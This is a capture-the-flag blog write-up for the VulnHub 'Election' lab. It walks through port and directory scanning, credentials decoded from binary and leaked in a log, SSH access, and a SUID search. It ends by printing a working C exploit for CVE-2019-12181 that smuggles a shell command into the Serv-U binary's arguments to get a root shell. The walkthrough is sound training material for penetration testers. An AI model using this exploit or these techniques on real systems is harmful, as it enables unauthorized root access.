---
published: true
layout: post
author: mark
date: '2021-09-07 00:00:01 UTC'
tags: ctf vulnhub election
---
Hello all. We have another day and another vuln machine to crack.
Today we are looking at [Election](https://www.vulnhub.com/entry/election-1,503/) (Medium difficulty)

Also make sure to check out the [VOD](https://www.youtube.com/channel/UCBE5zF0VuDwn2-cAMNBJvkA) on youtube if you missed the livestream. :)

## Prep:
- Get your VMs a running (Kali and _the target_)
- Ensure you have gobuster and seclists installed on your Kali machine.
- Something to drink
- Haxxor music

Just a handy hint. Export your targetip like below and then when you copy the commands no editing your ip into it required.

```
export TARGETIP=192.168.1.19
```

## Write up:

Ok, the votes are in and we need to start the hacking.
Lets kick it off with the same thing we start with always. A good old nmap scan.

```
nmap -sC -sV $TARGETIP -oN nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 06:41 EDT
Nmap scan report for 192.168.1.15
Host is up (0.0064s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.77 seconds
```

Looks like a pretty standard response, two open ports of 80 and 22. Lets leave 22 for later if we get some juicy ssh creds and kick off with checking out the website on port 80.

```
http://192.168.1.19
```

This just gives us a simple Apache default page which while it tells us some info about the server its not giving us the expected website to interact and exploit. Lets jump to gobuster to see if we can find more.

```
gobuster dir -u http://$TARGETIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x xml,txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,xml,txt,php
[+] Timeout:                 10s
===============================================================
2021/08/19 06:48:17 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.15/javascript/]
/robots.txt           (Status: 200) [Size: 30]
/election             (Status: 301) [Size: 315] [--> http://192.168.1.15/election/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.1.15/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 95413]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/08/19 06:55:54 Finished
===============================================================
```

This gives us some information to play around with. Lets take a look at the election redirection (which might be the main website). :D
There are a couple of other useful files to make a note of if we dont find an easy way through the website. Specifically phpinfo.php (can give us some info on the php version installed), robots.txt and phpmyadmin (probably locked behind an admin account but if we find creds we can try them there.)

So on to the election site.
```
http://192.168.1.20/election/
```
Looks like a simple 1page js site. It does mention register to admin which means there might be more not easily visible. Lets run another gobuster to see what we get.

```
gobuster dir -u http://$TARGETIP/election -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x xml,txt,php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.15/election
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,xml
[+] Timeout:                 10s
===============================================================
2021/08/19 20:52:37 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 7003]
/media                (Status: 301) [Size: 321] [--> http://192.168.1.15/election/media/]
/themes               (Status: 301) [Size: 322] [--> http://192.168.1.15/election/themes/]
/data                 (Status: 301) [Size: 320] [--> http://192.168.1.15/election/data/]
/admin                (Status: 301) [Size: 321] [--> http://192.168.1.15/election/admin/]
/lib                  (Status: 301) [Size: 319] [--> http://192.168.1.15/election/lib/]
/languages            (Status: 301) [Size: 325] [--> http://192.168.1.15/election/languages/]
/js                   (Status: 301) [Size: 318] [--> http://192.168.1.15/election/js/]
/card.php             (Status: 200) [Size: 1935]

===============================================================
2021/08/19 21:01:39 Finished
===============================================================
```

Couple of interesting looking results. Admin probably means an admin portal which they mentioned before but also there is another php page `card.php`. So lets jump to both of them and see what we see.

```
http://192.168.1.20/election/admin/
```

As expected gives us a possible login portal. Unfortunately no creds yet but before we bruteforce lets check that other php page.

```
http://192.168.1.20/election/card.php
```
Interesting, it looks like a bunch of binary at first glance. Lets see what happens when we try decode it.
![Binary1.png]({{site.baseurl}}/Images/vb-election/binary1.png)

I use [cyberchef](https://gchq.github.io/CyberChef/) from gchq, which is handy tool for doing lots of different operations without needing to try and figure it out in the command line. Copy out that binary, dump it into the input section, search for and add the `from binary` operation. Boom we have .... more binary as output? Lets try decode that too. Handy with cyberchef, just drag in another `from binary` operation and boom this time we are cooking with gas. Those look like credentials. :D

![binarytocreds1.png]({{site.baseurl}}/Images/vb-election/binarytocreds1.png)

```
user:1234
pass:Zxc123!@#
```

Now we have them. Lets work backwords and try them out. Lets start with the election/admin page as they were kinda hidden in the site with php and binary so maybe.

```
http://192.168.1.20/election/admin/
```

When we enter the user and then the password, we are able to login. Now lets see what we can do as an admin here.

Looks like a pretty standard backend allowing adding students, staff, candidates and admins. Nothing really stands out until you dive into the `settings` and then `system info` tile. It gives us some info on the server but also a logging tab. Which has a `view logs` button to click. Its a nice and simple system.log file, that has more credentials for us to save for later.

![systemlog.png]({{site.baseurl}}/Images/vb-election/systemlog.png)

```
love: P@$$w0rd@123
```

So first we tried them back in the phpmyadmin page with no luck. But then thinking back further we remember the nmap scan at the start that had another sneaky port open. 22. Lets try these as some ssh creds and see if we gets lucky.

```
ssh love@$TARGETIP
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

74 packages can be updated.
28 updates are security updates.

New release '20.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
```
And we are in with user love. Now we need that sweet taste of root.
Lets begin with some simple enumeration.
```
love@election:~$ sudo -l
[sudo] password for love:
Sorry, user love may not run sudo on election.
```
Not allowed to sudo :(

```
love@election:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
love:x:1000:1000:love,,,:/home/love:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
lightdm:x:124:128:Light Display Manager:/var/lib/lightdm:/bin/false
```
Nothing too noticeable in the passwd file either. Lets check some folders out.

Starting with home, desktop and downloads.

```
love@election:~$ ls ~/Desktop/
user.txt
love@election:~$ ls ~/Downloads/
love@election:~$ ls -la ~/
total 100
drwsrwxrwx 18 love love 4096 May 27  2020 .
drwxr-xr-x  3 root root 4096 Apr  9  2020 ..
-rw-------  1 love love   34 May 27  2020 .bash_history
drwxrwxrwx 15 love love 4096 Apr  8  2020 .cache
drwxrwxrwx 14 love love 4096 May 26  2020 .config
drwxrwxrwx  3 love love 4096 Oct 20  2019 .dbus
drwxrwxrwx  2 love love 4096 Apr  9  2020 Desktop
drwxrwxrwx  2 love love 4096 Apr  8  2020 Documents
drwxrwxrwx  2 love love 4096 Oct 20  2019 Downloads
drwxrwxrwx  3 love love 4096 Oct 20  2019 .gnupg
drwxrwxrwx  2 love love 4096 Oct 20  2019 .gvfs
-rwxrwxrwx  1 love love 9882 May 27  2020 .ICEauthority
drwxrwxrwx  3 love love 4096 Oct 20  2019 .local
drwxrwxrwx  5 love love 4096 Apr  2  2020 .mozilla
drwxrwxrwx  2 love love 4096 Oct 20  2019 Music
drwxrwxrwx  2 love love 4096 Oct 21  2019 Pictures
-rwxrwxrwx  1 love love  807 Oct 20  2019 .profile
drwxrwxrwx  2 love love 4096 Oct 20  2019 Public
-rwxrwxrwx  1 love love   66 Oct 20  2019 .selected_editor
-rw-rw-r--  1 love love   83 May 26  2020 .Serv-U-Tray.conf
drwxrwxrwx  2 love love 4096 Oct 20  2019 .ssh
-rwxrwxrwx  1 love love    0 Oct 20  2019 .sudo_as_admin_successful
drwxrwxrwx  2 love love 4096 Oct 20  2019 Templates
drwxrwxrwx  2 love love 4096 Oct 20  2019 Videos

```
Ah a nice `user.txt` for us. This might just be a user specific flag, or in might be something else. There’s a few other files that look interesting, we’ll get to those.
```
love@election:~$ head -c 5 ~/Desktop/user.txt
cd38a...
```
Confirmed, it’s just a random string, normally used for checking you got a flag.

Next let’s check bash_history:
```
love@election:~$ cat ~/.bash_history
rm .bash_history
rm .bash_history
```
Nothing there.

However the .sudo_as_admin_successful file tells me at some point this user did/could sudo:

[.sudo_as_admin_successful](https://askubuntu.com/questions/813942/is-it-possible-to-stop-sudo-as-admin-successful-being-created)

Still might not be our target

And .ssh:
```
love@election:~$ ls -la ~/.ssh
total 8
drwxrwxrwx  2 love love 4096 Oct 20  2019 .
drwsrwxrwx 18 love love 4096 May 27  2020 ..
```
Lets check the suids, guids and sticky bits out.

If you want to know more check out this link [Linux Handbook](https://linuxhandbook.com/suid-sgid-sticky-bit/)
```
love@election:~$ find / -perm -4000 2>/dev/null | xargs ls -la
-rwsr-xr-x  1 root root              30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x  1 root root              43088 Mar  5  2020 /bin/mount
-rwsr-xr-x  1 root root              64424 Jun 28  2019 /bin/ping
-rwsr-xr-x  1 root root              44664 Mar 23  2019 /bin/su
-rwsr-xr-x  1 root root              26696 Mar  5  2020 /bin/umount
-rwsr-xr-x  1 root root              43088 Oct 16  2018 /snap/core18/1066/bin/mount
-rwsr-xr-x  1 root root              64424 Mar 10  2017 /snap/core18/1066/bin/ping
-rwsr-xr-x  1 root root              44664 Mar 23  2019 /snap/core18/1066/bin/su
-rwsr-xr-x  1 root root              26696 Oct 16  2018 /snap/core18/1066/bin/umount
-rwsr-xr-x  1 root root              76496 Mar 23  2019 /snap/core18/1066/usr/bin/chfn
-rwsr-xr-x  1 root root              44528 Mar 23  2019 /snap/core18/1066/usr/bin/chsh
-rwsr-xr-x  1 root root              75824 Mar 23  2019 /snap/core18/1066/usr/bin/gpasswd
-rwsr-xr-x  1 root root              40344 Mar 23  2019 /snap/core18/1066/usr/bin/newgrp
-rwsr-xr-x  1 root root              59640 Mar 23  2019 /snap/core18/1066/usr/bin/passwd
-rwsr-xr-x  1 root root             149080 Jan 18  2018 /snap/core18/1066/usr/bin/sudo
-rwsr-xr--  1 root systemd-resolve   42992 Jun 10  2019 /snap/core18/1066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x  1 root root             436552 Mar  4  2019 /snap/core18/1066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x  1 root root              43088 Aug 23  2019 /snap/core18/1223/bin/mount
-rwsr-xr-x  1 root root              64424 Jun 28  2019 /snap/core18/1223/bin/ping
-rwsr-xr-x  1 root root              44664 Mar 23  2019 /snap/core18/1223/bin/su
-rwsr-xr-x  1 root root              26696 Aug 23  2019 /snap/core18/1223/bin/umount
-rwsr-xr-x  1 root root              76496 Mar 23  2019 /snap/core18/1223/usr/bin/chfn
-rwsr-xr-x  1 root root              44528 Mar 23  2019 /snap/core18/1223/usr/bin/chsh
-rwsr-xr-x  1 root root              75824 Mar 23  2019 /snap/core18/1223/usr/bin/gpasswd
-rwsr-xr-x  1 root root              40344 Mar 23  2019 /snap/core18/1223/usr/bin/newgrp
-rwsr-xr-x  1 root root              59640 Mar 23  2019 /snap/core18/1223/usr/bin/passwd
-rwsr-xr-x  1 root root             149080 Jan 18  2018 /snap/core18/1223/usr/bin/sudo
-rwsr-xr--  1 root systemd-resolve   42992 Jun 10  2019 /snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x  1 root root             436552 Mar  4  2019 /snap/core18/1223/usr/lib/openssh/ssh-keysign
-rwsr-xr-x  1 root root              40152 May 16  2019 /snap/core/7270/bin/mount
-rwsr-xr-x  1 root root              44168 May  8  2014 /snap/core/7270/bin/ping
-rwsr-xr-x  1 root root              44680 May  8  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x  1 root root              40128 Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x  1 root root              27608 May 16  2019 /snap/core/7270/bin/umount
-rwsr-xr-x  1 root root              71824 Mar 25  2019 /snap/core/7270/usr/bin/chfn
-rwsr-xr-x  1 root root              40432 Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x  1 root root              75304 Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x  1 root root              39904 Mar 25  2019 /snap/core/7270/usr/bin/newgrp
-rwsr-xr-x  1 root root              54256 Mar 25  2019 /snap/core/7270/usr/bin/passwd
-rwsr-xr-x  1 root root             136808 Jun 11  2019 /snap/core/7270/usr/bin/sudo
-rwsr-xr--  1 root systemd-resolve   42992 Jun 11  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x  1 root root             428240 Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x  1 root root             102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
-rwsr-xr--  1 root dip              394984 Jun 12  2018 /snap/core/7270/usr/sbin/pppd
-rwsr-xr-x  1 root root              40152 Aug 23  2019 /snap/core/7917/bin/mount
-rwsr-xr-x  1 root root              44168 May  8  2014 /snap/core/7917/bin/ping
-rwsr-xr-x  1 root root              44680 May  8  2014 /snap/core/7917/bin/ping6
-rwsr-xr-x  1 root root              40128 Mar 25  2019 /snap/core/7917/bin/su
-rwsr-xr-x  1 root root              27608 Aug 23  2019 /snap/core/7917/bin/umount
-rwsr-xr-x  1 root root              71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn
-rwsr-xr-x  1 root root              40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh
-rwsr-xr-x  1 root root              75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd
-rwsr-xr-x  1 root root              39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp
-rwsr-xr-x  1 root root              54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd
-rwsr-xr-x  1 root root             136808 Jun 11  2019 /snap/core/7917/usr/bin/sudo
-rwsr-xr--  1 root systemd-resolve   42992 Jun 11  2019 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x  1 root root             428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x  1 root root             106696 Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine
-rwsr-xr--  1 root dip              394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd
-rwsr-xr-x  1 root root              22528 Jun 28  2019 /usr/bin/arping
-rwsr-xr-x  1 root root              76496 Mar 23  2019 /usr/bin/chfn
-rwsr-xr-x  1 root root              44528 Mar 23  2019 /usr/bin/chsh
-rwsr-xr-x  1 root root              75824 Mar 23  2019 /usr/bin/gpasswd
-rwsr-xr-x  1 root root              40344 Mar 23  2019 /usr/bin/newgrp
-rwsr-xr-x  1 root root              59640 Mar 23  2019 /usr/bin/passwd
-rwsr-xr-x  1 root root              22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x  1 root root             149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x  1 root root              18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr--  1 root messagebus        42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x  1 root root              10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x  1 root root             436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x  1 root root              14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x  1 root root              10232 Dec 18  2019 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x  1 root root            6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U
-rwsr-xr--  1 root dip              382696 Feb 11  2020 /usr/sbin/pppd

/home/love:
total 100
drwsrwxrwx 18 love love 4096 May 27  2020 .
drwxr-xr-x  3 root root 4096 Apr  9  2020 ..
-rw-------  1 love love   34 May 27  2020 .bash_history
drwxrwxrwx 15 love love 4096 Apr  8  2020 .cache
drwxrwxrwx 14 love love 4096 May 26  2020 .config
drwxrwxrwx  3 love love 4096 Oct 20  2019 .dbus
drwxrwxrwx  2 love love 4096 Apr  9  2020 Desktop
drwxrwxrwx  2 love love 4096 Apr  8  2020 Documents
drwxrwxrwx  2 love love 4096 Oct 20  2019 Downloads
drwxrwxrwx  3 love love 4096 Oct 20  2019 .gnupg
drwxrwxrwx  2 love love 4096 Oct 20  2019 .gvfs
-rwxrwxrwx  1 love love 9882 May 27  2020 .ICEauthority
drwxrwxrwx  3 love love 4096 Oct 20  2019 .local
drwxrwxrwx  5 love love 4096 Apr  2  2020 .mozilla
drwxrwxrwx  2 love love 4096 Oct 20  2019 Music
drwxrwxrwx  2 love love 4096 Oct 21  2019 Pictures
-rwxrwxrwx  1 love love  807 Oct 20  2019 .profile
drwxrwxrwx  2 love love 4096 Oct 20  2019 Public
-rwxrwxrwx  1 love love   66 Oct 20  2019 .selected_editor
-rw-rw-r--  1 love love   83 May 26  2020 .Serv-U-Tray.conf
drwxrwxrwx  2 love love 4096 Oct 20  2019 .ssh
-rwxrwxrwx  1 love love    0 Oct 20  2019 .sudo_as_admin_successful
drwxrwxrwx  2 love love 4096 Oct 20  2019 Templates
drwxrwxrwx  2 love love 4096 Oct 20  2019 Videos
love@election:~$
```

Ok honesty time. Nothing initially stood out when we got here. We spent a fair bit of time spinning around, looking at cron jobs, and exploring the phpmyadmin to get into the db directly without much luck. After a day of refreshing gaming, we came back and decided to start looking some of the above listed applications from the sticky bits search.

Now if you go through you would probably find vulnerabilities on a bunch of the applications, we just need one to work. And because this is a web server, lets see what might be out of the ordinary. That `/usr/local/Serv-U/Serv-U` one stood out as it was the only one that wasnt in a bin/sbin/lib folder. Also with the lockdowns driving me a bit nuts I was hoping it was some sort of drinks serving robot to provide me with cold beverages. Lets check it out.

Checking the Serv-U dir.
```
love@election:/usr/local/Serv-U$ ls -la
total 8100
drwxr-xr-x 11 root root    4096 Sep  3  2021  .
drwxr-xr-x 12 root root    4096 May 26  2020  ..
drwxr-xr-x  6 root root    4096 May 26  2020  Client
drwxr-xr-x  7 root root    4096 May 26  2020 'Custom HTML Samples'
drwxr-xr-x  3 root root    4096 May 26  2020  Images
drwxr-xr-x  2 root root    4096 May 26  2020  Legal
drwxr-xr-x  2 root root    4096 May 26  2020  Scripts
-rwsr-xr-x  1 root root 6319088 Nov 29  2017  Serv-U
-rw-rw-rw-  1 root root    7402 May 27  2020  Serv-U.Archive
-rw-rw-rw-  1 root root    7402 May 27  2020  Serv-U.Archive.Backup
-rw-r--r--  1 root root      77 Sep  3  2021  .Serv-U.conf
-rw-r--r--  1 root root     932 Nov 29  2017  Serv-U-DefaultCertificate.crt
-rw-r--r--  1 root root    1041 Nov 29  2017  Serv-U-DefaultCertificate.key
drwxr-xr-x  2 root root    4096 May 26  2020 'Serv-U Integration Sample Shared Library'
-rw-rw-rw-  1 root root     978 Sep  3  2021  Serv-U-StartupLog.txt
-rwxr-xr-x  1 root root  402176 Nov 29  2017  Serv-U-Tray
drwxr-xr-x  2 root root    4096 May 27  2020  Shares
drwxr-xr-x  2 root root    4096 May 26  2020  Strings
drwxr-xr-x  5 root root    4096 May 26  2020 'Tray Themes'
-rwxr-xr-x  1 root root 1488915 May 26  2020  uninstall
```
Well there is a log file there. We had some luck with one of them in the past.

```
love@election:/usr/local/Serv-U$ cat Serv-U-StartupLog.txt
[01] Fri 03Sep21 17:12:19 - Serv-U File Server (64-bit) - Version 15.1 (15.1.6.25) - (C) 2017 SolarWinds Worldwide, LLC.  All rights reserved.
[01] Fri 03Sep21 17:12:19 - Build Date: Wednesday, November, 29, 2017 11:28 AM
[01] Fri 03Sep21 17:12:19 - Operating System: Linux 64-bit; Version: 5.3.0-46-generic
[01] Fri 03Sep21 17:12:19 - Loaded graphics library.
[01] Fri 03Sep21 17:12:19 - Unable to load ODBC database libraries.  Install package "unixODBC" to use a database within Serv-U.
[01] Fri 03Sep21 17:12:19 - Loaded SSL/TLS libraries.
[01] Fri 03Sep21 17:12:19 - Loaded SQLite library.
[01] Fri 03Sep21 17:12:19 - FIPS 140-2 mode is OFF.
[01] Fri 03Sep21 17:12:19 - LICENSE: Running beyond trial period.  Serv-U will no longer accept connections.
[01] Fri 03Sep21 17:12:19 - Socket subsystem initialized.
[01] Fri 03Sep21 17:12:19 - HTTP server listening on port number 43958, IP 127.0.0.1
[01] Fri 03Sep21 17:12:19 - HTTP server listening on port number 43958, IP ::1
```
It looks like a file server with an interesting name mentioned - Solarwinds (they were in the news for a breach right? so maybe there is an exploit?) Some of you might have known this straight away but I never looked that deep into the Solarwinds breach so yea well.

Back in Kali lets check it out.
```
┌──(kali㉿kali)-[~]
└─$ searchsploit serv-u    
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
Cat Soft Serv-U FTP Server 2.4/2.5 - FTP Directory Traversal                                           | windows/remote/20461.txt
Cat Soft Serv-U FTP Server 2.5 - Remote Buffer Overflow                                                | linux/remote/19218.c
Cat Soft Serv-U FTP Server 2.5.x - Brute Force                                                         | windows/remote/20334.java
Cat Soft Serv-U FTP Server 2.5/a/b (Windows 95/98/2000/NT 4.0) - Shortcut                              | windows/remote/19743.txt
Cat Soft Serv-U FTP Server 2.5a - SITE PASS Denial of Service                                          | windows/dos/19664.txt
RhinoSoft Serv-U FTP Server - Session Cookie Buffer Overflow (Metasploit)                              | windows/remote/16775.rb
RhinoSoft Serv-U FTP Server 3.x < 5.x - Local Privilege Escalation                                     | windows/local/381.c
RhinoSoft Serv-U FTP Server 3.x/4.x/5.0 - 'LIST' Buffer Overflow                                       | windows/dos/24029.pl
RhinoSoft Serv-U FTP Server 7.2.0.1 - 'rnto' Directory Traversal                                       | windows/remote/32456.txt
RhinoSoft Serv-U FTP Server 7.3 - (Authenticated) 'stou con:1' Denial of Service                       | windows/dos/6660.txt
RhinoSoft Serv-U FTP Server 7.4.0.1 - 'MKD' Create Arbitrary Directories                               | windows/remote/8211.pl
RhinoSoft Serv-U FTP Server 7.4.0.1 - 'SMNT' (Authenticated) Denial of Service                         | windows/dos/8212.pl
RhinoSoft Serv-U FTP Server < 5.2 - Remote Denial of Service                                           | windows/dos/463.c
RhinoSoft Serv-U FTPd Server - MDTM Overflow (Metasploit)                                              | windows/remote/16715.rb
RhinoSoft Serv-U FTPd Server 3.x/4.x - 'SITE CHMOD' Remote Overflow                                    | windows/remote/149.c
RhinoSoft Serv-U FTPd Server 3.x/4.x/5.x - 'MDTM' Remote Overflow                                      | windows/remote/158.c
RhinoSoft Serv-U FTPd Server 3/4 - MDTM Command Stack Overflow (1)                                     | windows/remote/23591.c
RhinoSoft Serv-U FTPd Server 3/4 - MDTM Command Stack Overflow (2)                                     | windows/remote/23592.c
RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (1)                          | windows/dos/23760.pl
RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (2)                          | windows/dos/23761.c
RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (3)                          | windows/dos/23762.c
RhinoSoft Serv-U FTPd Server 3/4/5 - MDTM Command Time Argument Buffer Overflow (4)                    | windows/remote/23763.c
RhinoSoft Serv-U FTPd Server 4.x - 'site chmod' Remote Buffer Overflow                                 | windows/remote/822.c
RhinoSoft Serv-U FTPd Server < 4.2 - Remote Buffer Overflow (Metasploit)                               | windows/remote/18190.rb
Serv-U FTP Server - Jail Break                                                                         | windows/remote/18182.txt
Serv-U FTP Server - prepareinstallation Privilege Escalation (Metasploit)                              | linux/local/47072.rb
Serv-U FTP Server 11.1.0.3 - Denial of Service / Security Bypass                                       | windows/dos/36405.txt
Serv-U FTP Server 7.3 - (Authenticated) Remote FTP File Replacement                                    | windows/remote/6661.txt
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)                                            | linux/local/47009.c
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)                                            | multiple/local/47173.sh
Serv-U Web Client 9.0.0.5 - Remote Buffer Overflow (1)                                                 | windows/remote/9966.txt
Serv-U Web Client 9.0.0.5 - Remote Buffer Overflow (2)                                                 | windows/remote/9800.cpp
------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Just a few results there. And with out version (from the log) of 15.1.6.25 we spot 2 local priv esc vulns that might be worth checking (specially with the SUID bit set which means the app runs as the owner and not as the user who started it).
If you want to check the exploit out online, browse here [Exploit DB - Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)](https://www.exploit-db.com/exploits/47009)
```
searchsploit -m 47009
```
This copies the exploit code to a local file. Lets take a look at it.
```
cat 47009.c

/*

CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation

vulnerability found by:
Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev

to compile and run:
gcc servu-pe-cve-2019-12181.c -o pe && ./pe

*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```
Seems like a fairly simple priv esc.

